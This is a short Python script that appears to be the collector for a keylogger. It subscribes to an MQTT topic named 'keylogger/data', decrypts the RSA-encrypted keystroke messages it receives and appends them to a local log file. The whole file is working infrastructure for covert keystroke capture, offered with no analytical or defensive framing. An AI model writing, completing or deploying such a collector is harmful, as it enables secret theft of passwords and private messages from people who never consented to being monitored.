import paho.mqtt.client as mqtt
import os
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
import base64

LOG_FILE = "keylogs.txt"

# Load private key for decryption
def load_private_key():
    with open("private_key.pem", "rb") as key_file:
        return serialization.load_pem_private_key(key_file.read(), password=None)

# Decrypt received data
def decrypt_data(private_key, encrypted_message):
    decrypted = private_key.decrypt(
        base64.b64decode(encrypted_message),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return decrypted.decode('utf-8')

# Callback when message is received
def on_message(client, userdata, msg):
    private_key = load_private_key()
    try:
        decrypted_data = decrypt_data(private_key, msg.payload.decode())
        print("received: {}".format(decrypted_data))  # Use .format() instead of f-string
        with open(LOG_FILE, "a") as f:
            f.write(decrypted_data)
    except Exception as e:
        print("Decryption error: {}".format(e))  # Use .format() instead of f-string

# MQTT setup with callback_api_version for version 2.0
client = mqtt.Client("Raspilogger", protocol=mqtt.MQTTv311)  # Fix constructor without callback_api_version
client.on_message = on_message
client.connect("0.0.0.0", 1883, 60)  # Ensure this IP is correct or use "localhost"
client.subscribe("keylogger/data")

try:
    client.loop_forever()
except KeyboardInterrupt:
    print("Exiting...")
    client.disconnect()  # Ensure proper disconnection
    client.loop_stop()  # Ensure the loop stops gracefully
